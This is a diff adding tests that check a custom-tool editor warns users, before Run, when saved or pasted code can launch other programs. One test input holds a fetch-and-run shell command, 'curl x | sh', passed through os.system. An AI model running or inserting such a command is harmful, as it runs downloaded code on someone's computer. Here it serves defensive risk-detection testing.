@@ -355,6 +355,67 @@ class TestTheTestRunIsRepresentative:
         assert service.resolve_media_dir is resolve_media_dir
 
 
+class TestTheWarningPrecedesTheRun:
+    """Every path that ends in Run must show the tool's reach BEFORE it runs.
+
+    Run executes the module, and the review gate requires pressing it — so a summary that only
+    arrives with the test RESULT describes something that already happened. The generate path
+    was fixed first; the EDIT path is the one a user takes with code they did not just watch
+    being written.
+    """
+
+    def test_listing_a_saved_tool_carries_its_risks(self, controller, store):
+        # The edit path renders from this payload. An empty banner over `import subprocess`
+        # affirmatively says "only reshapes text", which is the opposite of true.
+        ctrl, _ctx, _pushed = controller
+        store.write(
+            UserToolSource(
+                slug="risky",
+                code="import subprocess\n@register_tool('user:risky')\nclass T: pass\n",
+            )
+        )
+
+        payload = ctrl.on_list({})
+        listed = {tool["slug"]: tool for tool in payload["tools"]}["risky"]
+
+        assert "runs other programs on your computer" in listed["risks"]
+
+    def test_a_text_only_saved_tool_lists_no_risks(self, controller, store):
+        ctrl, _ctx, _pushed = controller
+        store.write(UserToolSource(slug="plain", code="import re\n"))
+
+        payload = ctrl.on_list({})
+        listed = {tool["slug"]: tool for tool in payload["tools"]}["plain"]
+
+        assert listed["risks"] == []
+
+    def test_the_editor_can_recompute_risks_for_pasted_source(self, controller):
+        # Pasting a different tool over this one changes what Run will execute, so the banner
+        # has to follow the text in the box rather than whatever arrived with it.
+        ctrl, _ctx, _pushed = controller
+
+        result = ctrl.on_risks({"source": "import os\n"})
+
+        assert "run other programs" in result["risks"][0]
+        assert ctrl.on_risks({"source": "import re\n"})["risks"] == []
+
+    def test_os_is_not_described_as_filesystem_only(self, controller):
+        """`os.system` and `os.popen` run programs.
+
+        The prompt tells the model "pathlib, subprocess and the rest are available", which makes
+        `os.system(f"ffmpeg …")` a likely generation — and a reviewer who has learned that "runs
+        other programs on your computer" is how that reads would otherwise conclude this tool
+        does not.
+        """
+        ctrl, _ctx, _pushed = controller
+
+        risks = ctrl.on_risks({"source": "import os\nos.system('curl x | sh')\n"})[
+            "risks"
+        ]
+
+        assert any("run other programs" in risk for risk in risks)
+
+
 class TestTheMediaSample:
     """Testing a tool that reads a FILE.
 
